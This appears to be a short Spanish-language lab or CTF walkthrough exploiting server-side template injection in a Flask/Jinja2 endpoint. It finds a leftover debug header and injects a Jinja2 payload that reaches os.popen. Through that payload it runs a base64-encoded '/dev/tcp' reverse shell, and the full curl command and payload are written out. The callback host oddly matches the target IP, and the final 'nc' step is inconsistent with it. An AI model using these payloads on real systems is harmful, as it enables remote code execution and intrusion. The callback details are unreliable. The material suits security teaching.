### SSTI

Del reconocimiento web obtenemos el siguiente archivo con información sobre un endpoint, que nos indica que se puede activar el modo debug mediante una cabecera para interactuar con el renderer de `flask`.
```
root@15485da21b1b:/opt/gobuster# curl 10.1.0.8:5042/static/js/debug.js
// static/js/debug.js
// paco: internal debug helper. NEVER linked from any template — leftover.
// (found via the exposed .git repo or by dirbusting /static/js/)
window.HAL_DEBUG = {
    // Setting this request header switches /evaluate into verbose render mode,
    // so the Jinja2-rendered output is returned instead of the opaque ack.
    debug_header: "X-Debug-Render",
    schema_endpoint: "/api/internal/schema",
    // legacy maintenance console — disabled in the UI, still on the server
    debug_endpoint: "/api/debug",
    note: "X-Debug-Render: true  ->  see what the template engine actually rendered"
};
```

La estrategia va a consistir en aprovechar que el `jinja2` del servidor va a interpretar de forma cruda el payload, por lo que abrimor el bloque de interpretación con `{{` y atravesamos dependencias hasta ejecutar un `popen` que nos permita levantar la shell remota en la máquina con un payload en `base64`.


```bash
PAYLOAD=$(echo bash -i >& /dev/tcp/10.1.0.8/4443 0>&1 | base64)

## Payload: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xLjAuOC80NDQzIDA+JjEK

## Codificado: YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xLjAuOC80NDQzIDA%2BJjEK
```

Ejecutamos remotamente:
```curl
curl -X POST "http://10.1.0.8:5042/evaluate"   -H "X-Debug-Render: true" -d "project_name={{ ''.__class__.__mro__[1].__subclasses__()[264].__init__.__globals__['__builtins__']['__import__']('os').popen('echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xLjAuOC80NDQzIDA%2BJjEK | base64 -d | bash').read() }}"
```

Y obtenemos shell al hacer `nc 10.1.0.8 4443`.